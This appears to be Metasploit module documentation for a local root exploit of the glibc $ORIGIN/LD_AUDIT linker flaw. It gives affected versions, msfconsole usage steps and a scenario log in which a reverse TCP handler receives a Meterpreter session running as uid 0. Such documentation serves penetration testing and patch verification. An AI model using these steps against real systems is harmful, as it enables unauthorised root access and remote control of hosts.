## Description

  This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker - aka glibc `$ORIGIN` expansion vulnerability.


## Vulnerable Application

  glibc `ld.so` in versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the `LD_AUDIT` environment variable when loading setuid executables. This allows control over the `$ORIGIN` library search path resulting in execution of arbitrary shared objects.

  This module opens a file descriptor to the specified suid executable via a hard link, then replaces the hard link with a shared object before instructing the linker to execute the file descriptor, resulting in arbitrary code execution.

  The specified setuid binary must be readable and located on the same file system partition as the specified writable directory.

  This module has been tested successfully on:

  * glibc 2.5 on CentOS 5.4 (x86_64)
  * glibc 2.5 on CentOS 5.5 (x86_64)
  * glibc 2.12 on Fedora 13 (i386, x86_64)

  RHEL 5 is reportedly affected, but untested.

  Some versions of `ld.so`, such as the version shipped with Ubuntu 14, hit a failed assertion in `dl_open_worker` causing exploitation to fail.


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Do: `use exploit/linux/local/glibc_origin_expansion_priv_esc`
  4. Do: `set SESSION [SESSION]`
  5. Do: `check`
  6. Do: `run`
  7. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)


## Scenarios

  ```
  msf > use exploit/linux/local/glibc_origin_expansion_priv_esc 
  msf exploit(linux/local/glibc_origin_expansion_priv_esc) > set session 1
  session => 1
  msf exploit(linux/local/glibc_origin_expansion_priv_esc) > run

  [*] Started reverse TCP handler on 172.16.191.244:4444 
  [+] The target appears to be vulnerable
  [*] Using target: Linux x86
  [*] Writing '/tmp/.R5Ork' (1279 bytes) ...
  [*] Writing '/tmp/.yE35DWbLd' (320 bytes) ...
  [*] Writing '/tmp/.sk7Z3Vl7vJ' (207 bytes) ...
  [*] Launching exploit...
  [*] Sending stage (857352 bytes) to 172.16.191.138
  [*] Meterpreter session 2 opened (172.16.191.244:4444 -> 172.16.191.138:59187) at 2018-01-27 04:21:24 -0500

  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : fedora13.localdomain
  OS           : Fedora 13 (Linux 2.6.33.3-85.fc13.i686.PAE)
  Architecture : i686
  BuildTuple   : i486-linux-musl
  Meterpreter  : x86/linux
  meterpreter >
  ```

